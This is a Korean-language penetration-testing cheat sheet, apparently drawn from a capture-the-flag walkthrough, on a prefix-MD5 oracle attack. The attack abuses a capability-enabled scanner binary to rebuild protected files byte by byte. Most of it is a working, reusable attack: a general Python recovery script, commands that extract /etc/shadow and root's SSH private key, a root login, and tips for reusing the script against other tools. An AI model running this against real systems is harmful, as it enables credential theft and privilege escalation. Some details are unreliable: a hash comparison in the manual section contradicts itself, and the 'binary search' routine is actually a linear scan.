# 09_Prefix_MD5_Oracle

---

### Prefix MD5 Oracle — 파일 내용 복원

파일을 직접 읽을 수는 없지만 앞 N바이트의 MD5 해시만 알 수 있을 때 사용하는 공격 기법이다. N을 1씩 늘리면서 MD5를 비교해 한 바이트씩 역추적하면 전체 파일 내용을 복원할 수 있다. Intentions 박스에서 cap_dac_read_search가 설정된 scanner 바이너리가 파일 내용을 출력하지 않고 MD5만 출력했던 케이스가 대표적이다. 파일 내용을 직접 읽지 못하게 제한된 환경에서 해시만 얻을 수 있다면 어디서든 적용 가능한 범용 기법이다.

---

### 원리

MD5는 결정론적 함수다. 같은 입력이면 항상 같은 해시가 나온다. 이 성질을 이용한다.

```
실제 파일 내용: "5e0d14c0..."

l=1 → scanner가 첫 1바이트의 MD5 출력
      → 내가 0~255 모든 바이트를 직접 MD5 계산해서 비교
      → MD5("5") 가 일치하면 첫 바이트는 "5"

l=2 → scanner가 첫 2바이트의 MD5 출력
      → 이미 "5"를 알고 있으니 "5" + 0~255 를 비교
      → MD5("5e") 가 일치하면 두 번째 바이트는 "e"

l=3 → 위를 반복...

→ 전체 파일 내용 복원
```

---

### 탐지 — Oracle 조건 확인

이 공격이 가능하려면 세 가지가 필요하다. 특권 파일을 읽을 수 있는 capability가 있는 바이너리, 앞 N바이트의 해시를 출력하는 기능, 그리고 N을 외부에서 제어할 수 있어야 한다.

```bash
# capability 있는 바이너리 탐지
getcap -r / 2>/dev/null
# cap_dac_read_search+ep 있는 바이너리 발견

# 바이너리 도움말 확인
/opt/scanner/scanner -h 2>&1 | head -30

# 기본 동작 확인
/opt/scanner/scanner -c /root/root.txt -s x -p -l 1
# [DEBUG] /root/root.txt has hash e4da3b7fbbce2345d7772b0674a318d5

# 검증 - 내가 아는 파일로 테스트
echo -n "A" | md5sum
# 7fc56270e7a70fa81a5935b72eacbe29
/opt/scanner/scanner -c /etc/hostname -s x -p -l 1
# 출력 해시가 첫 글자 MD5와 일치하면 oracle 가능
```

---

### 수동 방식 — 원리 이해용

```bash
# l=1 로 첫 바이트 MD5 얻기
/opt/scanner/scanner -c /root/root.txt -s x -p -l 1
# [DEBUG] /root/root.txt has hash e4da3b7fbbce2345d7772b0674a318d5

# 모든 hex 문자 직접 MD5 계산해서 비교
for c in 0 1 2 3 4 5 6 7 8 9 a b c d e f; do
    h=$(echo -n "$c" | md5sum | cut -d' ' -f1)
    echo "$c -> $h"
done
# 5 -> 6e8b8a347520b7d50bc8d9c697c34d73  ← 이게 e4da3b...와 달라서 계속

# 실제로는 e4da3b7fbbce2345d7772b0674a318d5 = md5("5")
echo -n "5" | md5sum
# e4da3b7fbbce2345d7772b0674a318d5  ← 일치! 첫 바이트 = "5"

# l=2 로 두 번째 바이트 찾기 ("5" + ?)
/opt/scanner/scanner -c /root/root.txt -s x -p -l 2
# [DEBUG] /root/root.txt has hash 459a2b5f4a9f9e8d...

echo -n "5e" | md5sum   # "e" 시도
# 일치하면 두 번째 바이트 = "e"
```

---

### 범용 Python 스크립트 — 실전용

이 스크립트 하나로 어떤 도구든 `{target}` 과 `{n}` 만 바꿔서 사용할 수 있다.

```python
#!/usr/bin/env python3
# Prefix MD5 Oracle — 범용 파일 복원기
# 사용법: python3 oracle.py --target <파일> --cmd '<명령어 템플릿>' --mode <hex|ascii|all>

import argparse, hashlib, subprocess, sys, string

def get_hash(cmd_template, target, n):
    """명령어 실행해서 MD5 해시 추출"""
    cmd = cmd_template.replace("{target}", target).replace("{n}", str(n))
    p = subprocess.run(
        cmd, shell=True,
        stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
    )
    # 출력에서 32자리 hex 문자열 추출
    for word in p.stdout.split():
        w = word.strip()
        if len(w) == 32 and all(c in "0123456789abcdefABCDEF" for c in w):
            return w.lower()
    return None

def main():
    parser = argparse.ArgumentParser(description="Prefix MD5 Oracle 파일 복원기")
    parser.add_argument("--target",  required=True, help="복원할 파일 경로")
    parser.add_argument("--cmd",     required=True, help="명령어 템플릿 ({target}, {n} 사용)")
    parser.add_argument("--mode",    choices=["hex","ascii","all"], default="all",
                        help="문자셋 선택 (hex=플래그, ascii=텍스트, all=바이너리)")
    parser.add_argument("--stop",    default="", help="이 문자열 발견 시 중단")
    parser.add_argument("--max",     type=int, default=4096, help="최대 복원 바이트 수")
    parser.add_argument("--output",  default="", help="결과 저장 파일 (없으면 stdout)")
    args = parser.parse_args()

    # 문자셋 설정
    if args.mode == "hex":
        charset = b"0123456789abcdef\n"       # HTB flag 복원용
    elif args.mode == "ascii":
        charset = bytes(string.printable, "ascii")  # 텍스트 파일용
    else:
        charset = bytes(range(256))            # SSH 키 등 바이너리용

    out = b""
    sys.stderr.write(f"[*] 복원 시작: {args.target}\n")
    sys.stderr.write(f"[*] 문자셋: {args.mode} ({len(charset)}종)\n\n")

    for n in range(1, args.max + 1):
        target_hash = get_hash(args.cmd, args.target, n)
        if not target_hash:
            sys.stderr.write(f"\n[!] {n}바이트에서 해시 추출 실패. 종료\n")
            break

        found = None
        for c in charset:
            guess = out + bytes([c])
            if hashlib.md5(guess).hexdigest() == target_hash:
                found = bytes([c])
                break

        if found is None:
            sys.stderr.write(f"\n[!] {n}바이트에서 매칭 실패. 문자셋 변경 필요\n")
            break

        out += found
        # stdout으로 실시간 출력
        sys.stdout.buffer.write(found)
        sys.stdout.buffer.flush()

        # 종료 조건 확인
        if args.stop and args.stop.encode() in out:
            sys.stderr.write(f"\n[+] 종료 문자열 발견. 완료\n")
            break

    # 파일로 저장
    if args.output:
        with open(args.output, "wb") as f:
            f.write(out)
        sys.stderr.write(f"[+] {args.output} 에 저장됨\n")

    sys.stderr.write(f"\n[+] 총 {len(out)}바이트 복원 완료\n")

if __name__ == "__main__":
    main()
```

---

### 실전 사용 — Intentions 박스 기준

```bash
# 스크립트 저장
nano /tmp/oracle.py
chmod +x /tmp/oracle.py

# root.txt 복원 (hex 문자셋)
python3 /tmp/oracle.py \
  --target /root/root.txt \
  --cmd '/opt/scanner/scanner -c {target} -s x -p -l {n}' \
  --mode hex \
  --max 33
# 출력: 5e0d14c0371ce9944301931bebd23a81

# /etc/shadow 복원 (ascii 문자셋)
python3 /tmp/oracle.py \
  --target /etc/shadow \
  --cmd '/opt/scanner/scanner -c {target} -s x -p -l {n}' \
  --mode ascii \
  --max 2000 \
  --output /tmp/shadow.txt

# root SSH 키 복원 (바이너리 문자셋)
python3 /tmp/oracle.py \
  --target /root/.ssh/id_rsa \
  --cmd '/opt/scanner/scanner -c {target} -s x -p -l {n}' \
  --mode all \
  --stop '-----END OPENSSH PRIVATE KEY-----' \
  --max 4096 \
  --output /tmp/root_id_rsa

chmod 600 /tmp/root_id_rsa
ssh -i /tmp/root_id_rsa root@127.0.0.1
```

---

### 다른 박스 적용 — 명령어 템플릿만 교체

다른 도구가 같은 방식으로 동작하면 `--cmd` 만 바꿔서 그대로 사용할 수 있다.

```bash
# 예시: weirdtool --file <대상> --length <N> --debug 형태로 MD5 출력하는 경우
python3 /tmp/oracle.py \
  --target /root/root.txt \
  --cmd 'weirdtool --file {target} --length {n} --debug' \
  --mode hex \
  --max 33

# 예시: custom_checker <대상> <N> 형태
python3 /tmp/oracle.py \
  --target /root/root.txt \
  --cmd 'custom_checker {target} {n}' \
  --mode hex

# 핵심: 출력에서 32자리 hex 문자열만 추출하면 어떤 도구든 동작
```

---

### 속도 최적화 — 이진 탐색

charset이 크면 최악의 경우 256번 시도가 필요하다. 이진 탐색으로 줄일 수 있다.

```python
# ASCII 범위에서 이진 탐색으로 한 바이트 찾기
def find_byte_binary(out, target_hash, lo=0, hi=127):
    """이진 탐색으로 바이트 찾기 - 최대 7회 시도로 줄어듦"""
    while lo < hi:
        mid = (lo + hi) // 2
        # mid 이하인 모든 바이트 후보에서 해시 비교
        for c in range(lo, mid + 1):
            if hashlib.md5(out + bytes([c])).hexdigest() == target_hash:
                return bytes([c])
        lo = mid + 1
    # 단일값 확인
    c = lo
    if hashlib.md5(out + bytes([c])).hexdigest() == target_hash:
        return bytes([c])
    return None

# hex 모드는 charset이 17개뿐이라 이진탐색 필요 없음
# all 모드(256)나 ascii 모드(95)에서 효과적
```

---

### 해시 추출 실패 시 대처

출력 형식이 다른 경우 해시 추출 정규식을 조정해야 한다.

```python
import re

def get_hash_flexible(output):
    """다양한 출력 형식에서 MD5 추출"""
    # [DEBUG] /path/to/file has hash XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
    m = re.search(r'hash\s+([0-9a-fA-F]{32})', output)
    if m:
        return m.group(1).lower()

    # MD5: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
    m = re.search(r'(?:MD5|md5|Hash|hash)[:\s]+([0-9a-fA-F]{32})', output)
    if m:
        return m.group(1).lower()

    # 출력에서 32자리 hex 단독 등장
    m = re.search(r'\b([0-9a-fA-F]{32})\b', output)
    if m:
        return m.group(1).lower()

    return None
```